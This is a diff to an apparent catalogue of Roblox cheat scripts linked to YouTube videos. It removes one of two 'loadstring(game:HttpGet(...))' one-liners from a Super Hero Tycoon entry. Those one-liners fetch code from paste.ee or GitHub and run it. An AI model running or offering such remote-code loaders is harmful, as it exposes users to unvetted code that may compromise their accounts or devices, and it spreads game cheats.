@@ -672,7 +672,7 @@
     "video300": {
         "url": "https://www.youtube.com/watch?v=TR-JndgSdDI",
         "title": "[Best] 🦸‍♂️ Super Hero Tycoon 💥 No Linkvertise! Auto Money! 💥 PC & Mobile! (2024)",
-            "script": "loadstring(game:HttpGet('https://paste.ee/r/0ccCC', true))(); loadstring(game:HttpGet('https://raw.githubusercontent.com/MinionRoblox/SUPER-HERO-TYCOON/main/Scripts%20from%20Minion'))()"
+            "script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/MinionRoblox/SUPER-HERO-TYCOON/main/Scripts%20from%20Minion'))()"
     },
     "video299": {
         "url": "https://www.youtube.com/watch?v=arRVvnOkzb8",
